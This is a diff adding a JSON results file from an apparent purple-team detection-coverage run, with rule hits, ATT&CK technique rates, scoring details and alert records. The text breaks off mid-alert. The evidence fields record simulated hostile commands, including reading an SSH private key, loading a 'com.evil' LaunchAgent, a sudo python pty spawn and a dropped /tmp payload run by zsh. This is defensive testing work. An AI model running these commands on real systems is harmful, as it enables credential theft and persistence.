@@ -1,0 +1,1452 @@
+{
+  "chains_total": 10,
+  "chains_fired": 10,
+  "chain_score": 1.0,
+  "alerts_fired": 28,
+  "distinct_rules_fired": 25,
+  "rules_fired": [
+    "Data Exfiltration Volume",
+    "Download and Execute Pattern",
+    "Encoded Command Execution",
+    "Hidden File Creation in User Directories",
+    "LaunchAgent Persistence Created",
+    "Living-off-the-Land Binary Execution",
+    "Log File Deletion",
+    "Login from Unusual Geography",
+    "Outbound Connection to Rare/C2 Port",
+    "Privilege Escalation via Sudo",
+    "Renamed System Binary (Masquerading)",
+    "Reverse Shell Pattern Detected",
+    "Script Interpreter from Unexpected Location",
+    "Service Account Anomaly",
+    "Suspicious Process from /tmp",
+    "ai_process_egress",
+    "ai_verdict_block_sustained",
+    "brute_force_success",
+    "clickfix_dropper_execution",
+    "credential_theft_exfil",
+    "data_exfiltration",
+    "macOS Local Account Created (users differential)",
+    "payload_callback",
+    "persistence_activated",
+    "privilege_escalation_chain"
+  ],
+  "techniques_hit": [
+    "T1027",
+    "T1036",
+    "T1048",
+    "T1059",
+    "T1070",
+    "T1071",
+    "T1078",
+    "T1110",
+    "T1136",
+    "T1190",
+    "T1204.004",
+    "T1218",
+    "T1547",
+    "T1548",
+    "T1552",
+    "T1564"
+  ],
+  "techniques_hit_armed": [
+    "T1027",
+    "T1036",
+    "T1048",
+    "T1059",
+    "T1070",
+    "T1071",
+    "T1078",
+    "T1110",
+    "T1136",
+    "T1190",
+    "T1204.004",
+    "T1218",
+    "T1547",
+    "T1548",
+    "T1552",
+    "T1564"
+  ],
+  "armed_techniques_total": 42,
+  "technique_hit_rate_armed": 0.381,
+  "armed_techniques_not_hit_by_this_run": [
+    "T1003",
+    "T1021",
+    "T1041",
+    "T1047",
+    "T1053",
+    "T1055",
+    "T1074",
+    "T1090",
+    "T1098",
+    "T1176",
+    "T1213",
+    "T1219",
+    "T1486",
+    "T1490",
+    "T1505",
+    "T1543",
+    "T1546",
+    "T1550",
+    "T1553",
+    "T1555",
+    "T1560",
+    "T1562",
+    "T1567",
+    "T1572",
+    "T1574",
+    "T1606"
+  ],
+  "coverage_summary": {
+    "total_rules": 126,
+    "armed": 102,
+    "dormant": 24,
+    "lookback_hours": 168,
+    "as_of": "2026-09-18T16:34:41.741341+00:00"
+  },
+  "run_window_start": "2026-09-18T16:29:44.957807+00:00",
+  "chains_detail": [
+    [
+      "ai_process_egress",
+      true
+    ],
+    [
+      "ai_verdict_block_sustained",
+      true
+    ],
+    [
+      "brute_force_success",
+      true
+    ],
+    [
+      "clickfix_dropper_execution",
+      true
+    ],
+    [
+      "credential_theft_exfil",
+      true
+    ],
+    [
+      "data_exfiltration",
+      true
+    ],
+    [
+      "defense_evasion_cleanup",
+      true
+    ],
+    [
+      "payload_callback",
+      true
+    ],
+    [
+      "persistence_activated",
+      true
+    ],
+    [
+      "privilege_escalation_chain",
+      true
+    ]
+  ],
+  "chain_matches_persisted": 9,
+  "match_hosts": [
+    "live-matrix-ai_process_egress-163144",
+    "live-matrix-ai_verdict_block_sustained-163144",
+    "live-matrix-brute_force_success-163144",
+    "live-matrix-clickfix_dropper_execution-163144",
+    "live-matrix-credential_theft_exfil-163144",
+    "live-matrix-data_exfiltration-163144",
+    "live-matrix-payload_callback-163144",
+    "live-matrix-persistence_activated-163144",
+    "live-matrix-privilege_escalation_chain-163144"
+  ],
+  "mode": "matrix",
+  "coverage_before": {
+    "armed": 101,
+    "total_rules": 126
+  },
+  "feedback": [],
+  "progression": [
+    {
+      "run": "purple-20260911T152518Z",
+      "chains_fired": 8,
+      "chains_total": 8,
+      "chain_score": 1.0,
+      "armed_rules": 86,
+      "technique_hit_rate_armed": 0.371
+    },
+    {
+      "run": "purple-20260911T184340Z",
+      "chains_fired": 7,
+      "chains_total": 8,
+      "chain_score": 0.875,
+      "armed_rules": 86,
+      "technique_hit_rate_armed": 0.2
+    },
+    {
+      "run": "purple-20260911T184744Z",
+      "chains_fired": 2,
+      "chains_total": 8,
+      "chain_score": 0.25,
+      "armed_rules": 86,
+      "technique_hit_rate_armed": 0.086
+    },
+    {
+      "run": "purple-20260911T185056Z",
+      "chains_fired": 8,
+      "chains_total": 8,
+      "chain_score": 1.0,
+      "armed_rules": 86,
+      "technique_hit_rate_armed": 0.0
+    },
+    {
+      "run": "purple-20260911T191054Z",
+      "chains_fired": 8,
+      "chains_total": 8,
+      "chain_score": 1.0,
+      "armed_rules": 86,
+      "technique_hit_rate_armed": 0.257
+    },
+    {
+      "run": "purple-20260911T193228Z",
+      "chains_fired": 8,
+      "chains_total": 8,
+      "chain_score": 1.0,
+      "armed_rules": 90,
+      "technique_hit_rate_armed": 0.306
+    },
+    {
+      "run": "purple-20260912T131438Z",
+      "chains_fired": 7,
+      "chains_total": 8,
+      "chain_score": 0.875,
+      "armed_rules": 92,
+      "technique_hit_rate_armed": 0.189
+    },
+    {
+      "run": "purple-20260912T132254Z",
+      "chains_fired": 8,
+      "chains_total": 8,
+      "chain_score": 1.0,
+      "armed_rules": 92,
+      "technique_hit_rate_armed": 0.081
+    },
+    {
+      "run": "purple-20260914T124904Z",
+      "chains_fired": 7,
+      "chains_total": 10,
+      "chain_score": 0.7,
+      "armed_rules": 102,
+      "technique_hit_rate_armed": 0.286
+    },
+    {
+      "run": "purple-20260914T125948Z",
+      "chains_fired": 0,
+      "chains_total": 10,
+      "chain_score": 0.0,
+      "armed_rules": 102,
+      "technique_hit_rate_armed": 0.0
+    },
+    {
+      "run": "purple-20260914T131433Z",
+      "chains_fired": 0,
+      "chains_total": 10,
+      "chain_score": 0.0,
+      "armed_rules": 102,
+      "technique_hit_rate_armed": 0.286
+    },
+    {
+      "run": "purple-20260914T132209Z",
+      "chains_fired": 0,
+      "chains_total": 10,
+      "chain_score": 0.0,
+      "armed_rules": 102,
+      "technique_hit_rate_armed": 0.286
+    },
+    {
+      "run": "purple-20260914T132947Z",
+      "chains_fired": 10,
+      "chains_total": 10,
+      "chain_score": 1.0,
+      "armed_rules": 102,
+      "technique_hit_rate_armed": 0.381
+    },
+    {
+      "run": "(this run)",
+      "chains_fired": 10,
+      "chains_total": 10,
+      "chain_score": 1.0,
+      "armed_rules": 102,
+      "technique_hit_rate_armed": 0.381
+    }
+  ],
+  "tes": {
+    "methodology": "MITRE ATT&CK Evaluations Enterprise 2026 \u2014 TES, self-scored",
+    "methodology_source": "https://evals.mitre.org/methodology-specification",
+    "label": "self-scored against the published methodology; NOT program participation",
+    "modifier": "(P) for DQI \u2014 platform-produced detections",
+    "pq": {
+      "scored": false,
+      "reason": "detection-only run: no protection/blocked stages execute, so PC/PP (and PQI) are not scored \u2014 never inferred"
+    },
+    "config_sha256": "2dbe6f19b973b3f3aedc498f0816a538a66f623196559fb8bb603157d0647abd",
+    "weighted_dc": {
+      "weighted": 2.0,
+      "normalized": 0.667
+    },
+    "behaviors": [
+      {
+        "chain": "ai_process_egress",
+        "technique": "T1027",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "ai_process_egress",
+        "technique": "T1048",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 904,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "ai_verdict_block_sustained",
+        "technique": "T1190",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 902,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHERE",
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "brute_force_success",
+        "technique": "T1078",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "brute_force_success",
+        "technique": "T1110",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 894,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "clickfix_dropper_execution",
+        "technique": "T1059",
+        "tier": "high",
+        "acw": 0.75,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 903,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHERE",
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "clickfix_dropper_execution",
+        "technique": "T1204.004",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 903,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHERE",
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "credential_theft_exfil",
+        "technique": "T1048",
+        "tier": "high",
+        "acw": 0.75,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 900,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "credential_theft_exfil",
+        "technique": "T1552",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 900,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "data_exfiltration",
+        "technique": "T1048",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 897,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "defense_evasion_cleanup",
+        "technique": "T1059",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "defense_evasion_cleanup",
+        "technique": "T1070",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 908,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHERE",
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-1",
+          "score": 1.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": false,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "alert enrichment only \u2014 no correlation"
+        }
+      },
+      {
+        "chain": "payload_callback",
+        "technique": "T1036",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "payload_callback",
+        "technique": "T1059",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 934,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "payload_callback",
+        "technique": "T1071",
+        "tier": "high",
+        "acw": 0.75,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 927,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": true,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "persistence_activated",
+        "technique": "T1218",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "persistence_activated",
+        "technique": "T1547",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 895,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHERE",
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      },
+      {
+        "chain": "persistence_activated",
+        "technique": "T1564",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "privilege_escalation_chain",
+        "technique": "T1036",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "privilege_escalation_chain",
+        "technique": "T1059",
+        "tier": null,
+        "acw": null,
+        "unmeasured_reason": "technique fired in the run but has no ACW weight in the config"
+      },
+      {
+        "chain": "privilege_escalation_chain",
+        "technique": "T1548",
+        "tier": "critical",
+        "acw": 1.0,
+        "dc": {
+          "tier": "DC-2",
+          "score": 2.0,
+          "reason": "alert fired but no alert carries all six DC-3 elements",
+          "alert_id": 898,
+          "elements": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "blocking_elements": [
+            "WHERE",
+            "WHO"
+          ]
+        },
+        "mttd_minutes": null,
+        "ds": {
+          "score": null,
+          "unmeasured_reason": "no derivable first-detection timestamp"
+        },
+        "ic": {
+          "tier": "IC-2",
+          "score": 2.0,
+          "core": {
+            "WHO": false,
+            "WHAT": true,
+            "WHEN": true,
+            "WHERE": false,
+            "HOW": true,
+            "SEVERITY": true
+          },
+          "extended": {
+            "EVIDENCE": true,
+            "CORRELATION": true,
+            "SCOPE": false,
+            "DISPOSITION": false
+          },
+          "reason": "correlated investigation (multi-alert case or correlation match)"
+        }
+      }
+    ],
+    "dp": {
+      "value": null,
+      "unmeasured_reason": "no cases to measure consolidation against",
+      "tp": 13,
+      "fp": 0,
+      "cases": 0
+    },
+    "ds_normalized": null,
+    "dqi": null,
+    "iqi": {
+      "weighted_ic_normalized": 0.639,
+      "ap": {
+        "value": null,
+        "unmeasured_reason": "no investigation conclusions in the run window"
+      },
+      "cs": {
+        "value": null,
+        "unmeasured_reason": "no defensible conclusion yet \u2014 human adjudication pending"
+      },
+      "value": null,
+      "unmeasured_reasons": [
+        "AP",
+        "CS_normalized"
+      ]
+    },
+    "tes": null,
+    "unmeasured_scenarios": []
+  },
+  "alerts": [
+    {
+      "id": 894,
+      "host_name": "live-matrix-brute_force_success-163144",
+      "rule_name": "brute_force_success",
+      "severity": "critical",
+      "mitre_techniques": [
+        "T1110"
+      ],
+      "time": "2026-09-18 16:33:13.501712+00:00",
+      "description": "Brute Force -> Successful Login",
+      "evidence": "{\"match\": {\"title\": \"Brute Force -> Successful Login\", \"severity\": \"critical\", \"host_name\": \"live-matrix-brute_force_success-163144\", \"source_ip\": \"198.51.100.70\", \"user_name\": \"admin\", \"confidence\": 85, \"failed_count\": 4, \"success_time\": \"2026-09-18 16:31:15+00:00\", \"mitre_tactics\": [\"TA0006\"], \"correlation_id\": \"83adf871-648c-42a4-a654-061a1995ebc9\", \"correlation_rule\": \"brute_force_success\", \"mitre_techniques\": [\"T1110\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 895,
+      "host_name": "live-matrix-persistence_activated-163144",
+      "rule_name": "persistence_activated",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1547"
+      ],
+      "time": "2026-09-18 16:33:13.507594+00:00",
+      "description": "Persistence Created -> Activated",
+      "evidence": "{\"match\": {\"title\": \"Persistence Created -> Activated\", \"severity\": \"high\", \"file_path\": \"/Users/admin/Library/LaunchAgents/com.evil.liveagent.plist\", \"host_name\": \"live-matrix-persistence_activated-163144\", \"load_time\": \"2026-09-18 16:30:45+00:00\", \"confidence\": 70, \"load_command\": \"launchctl load /Users/admin/Library/LaunchAgents/com.evil.liveagent.plist\", \"creation_time\": \"2026-09-18 16:30:15+00:00\", \"mitre_tactics\": [\"TA0003\"], \"correlation_id\": \"c12638dd-d793-4bca-bcaa-d8125cc17034\", \"correlation_rule\": \"persistence_activated\", \"mitre_techniques\": [\"T1547\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 897,
+      "host_name": "live-matrix-data_exfiltration-163144",
+      "rule_name": "data_exfiltration",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1048"
+      ],
+      "time": "2026-09-18 16:33:13.512997+00:00",
+      "description": "Large Outbound Transfer / Connection Burst",
+      "evidence": "{\"match\": {\"title\": \"Large Outbound Transfer / Connection Burst\", \"severity\": \"high\", \"host_name\": \"live-matrix-data_exfiltration-163144\", \"confidence\": 67, \"signal_type\": \"connection_burst\", \"total_bytes\": \"0\", \"last_transfer\": \"2026-09-18 16:30:39+00:00\", \"mitre_tactics\": [\"TA0010\"], \"correlation_id\": \"ff853a67-33b2-4a72-97f7-06805201d59e\", \"destination_ip\": \"203.0.113.10\", \"connection_count\": 55, \"correlation_rule\": \"data_exfiltration\", \"mitre_techniques\": [\"T1048\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 898,
+      "host_name": "live-matrix-privilege_escalation_chain-163144",
+      "rule_name": "privilege_escalation_chain",
+      "severity": "critical",
+      "mitre_techniques": [
+        "T1548"
+      ],
+      "time": "2026-09-18 16:33:13.515340+00:00",
+      "description": "Privilege Escalation -> Root Process",
+      "evidence": "{\"match\": {\"title\": \"Privilege Escalation -> Root Process\", \"severity\": \"critical\", \"host_name\": \"live-matrix-privilege_escalation_chain-163144\", \"priv_time\": \"2026-09-18 16:30:15+00:00\", \"root_time\": \"2026-09-18 16:30:45+00:00\", \"confidence\": 70, \"root_process\": \"python3\", \"mitre_tactics\": [\"TA0004\"], \"correlation_id\": \"0157fddf-8a33-4f49-b0db-236f83ea5fa7\", \"escalated_user\": \"admin\", \"process_cmdline\": \"python3 -c 'import pty'\", \"correlation_rule\": \"privilege_escalation_chain\", \"mitre_techniques\": [\"T1548\"], \"escalation_method\": \"sudo\"}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 900,
+      "host_name": "live-matrix-credential_theft_exfil-163144",
+      "rule_name": "credential_theft_exfil",
+      "severity": "critical",
+      "mitre_techniques": [
+        "T1552",
+        "T1048"
+      ],
+      "time": "2026-09-18 16:33:13.520678+00:00",
+      "description": "Credential Access -> External Connection",
+      "evidence": "{\"match\": {\"title\": \"Credential Access -> External Connection\", \"severity\": \"critical\", \"conn_time\": \"2026-09-18 16:30:45+00:00\", \"host_name\": \"live-matrix-credential_theft_exfil-163144\", \"user_name\": \"admin\", \"confidence\": 80, \"access_time\": \"2026-09-18 16:30:15+00:00\", \"access_target\": \"cat /Users/admin/.ssh/id_rsa\", \"mitre_tactics\": [\"TA0006\", \"TA0010\"], \"access_process\": \"cat\", \"correlation_id\": \"2a2838b6-7e31-49ac-8ddf-ee5e12a04534\", \"destination_ip\": \"203.0.113.10\", \"correlation_rule\": \"credential_theft_exfil\", \"mitre_techniques\": [\"T1552\", \"T1048\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 902,
+      "host_name": "live-matrix-ai_verdict_block_sustained-163144",
+      "rule_name": "ai_verdict_block_sustained",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1190"
+      ],
+      "time": "2026-09-18 16:33:13.567097+00:00",
+      "description": "Sustained AI Firewall BLOCK Verdicts",
+      "evidence": "{\"match\": {\"title\": \"Sustained AI Firewall BLOCK Verdicts\", \"source\": \"neuralguard\", \"severity\": \"high\", \"host_name\": \"live-matrix-ai_verdict_block_sustained-163144\", \"tenant_id\": \"live-matrix-tenant\", \"confidence\": 85, \"block_count\": 12, \"mitre_tactics\": [\"TA0001\"], \"correlation_id\": \"1a91c12d-c714-4cca-a50e-0ff8990da7ce\", \"last_block_time\": \"2026-09-18 16:33:05.624297+00:00\", \"correlation_rule\": \"ai_verdict_block_sustained\", \"mitre_techniques\": [\"T1190\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 903,
+      "host_name": "live-matrix-clickfix_dropper_execution-163144",
+      "rule_name": "clickfix_dropper_execution",
+      "severity": "high",
+      "mitre_techniques": [
+        "T1204.004",
+        "T1059"
+      ],
+      "time": "2026-09-18 16:33:13.569604+00:00",
+      "description": "ClickFix Drop -> Interpreter Execution",
+      "evidence": "{\"match\": {\"title\": \"ClickFix Drop -> Interpreter Execution\", \"severity\": \"high\", \"drop_time\": \"2026-09-18 16:30:15+00:00\", \"exec_time\": \"2026-09-18 16:30:45+00:00\", \"file_path\": \"/tmp/cf-payload.command\", \"host_name\": \"live-matrix-clickfix_dropper_execution-163144\", \"user_name\": null, \"confidence\": 75, \"process_name\": \"zsh\", \"process_path\": \"/bin/zsh\", \"mitre_tactics\": [\"TA0001\", \"TA0002\"], \"correlation_id\": \"b35b8ab6-d598-4a9c-b029-f21c44b5feab\", \"process_cmdline\": \"/bin/zsh /tmp/cf-payload.command\", \"correlation_rule\": \"clickfix_dropper_execution\", \"mitre_techniques\": [\"T1204.004\", \"T1059\"]}}",
+      "ai_summary": null,
+      "case_id": null,
+      "status": "new",
+      "resolved_at": null
+    },
+    {
+      "id": 904,
+      "host_name": "live-matrix-ai_process_egress-163144",
+      "rule_name": "ai_process_egress",
+      "severity": "medium",
+      "mitre_techniques": [
+        "T1048"
+      ],
+      "time": "2026-09-18 16:33:13.572405+00:00",
+      "description": "AI CLI Process -> External Egress",
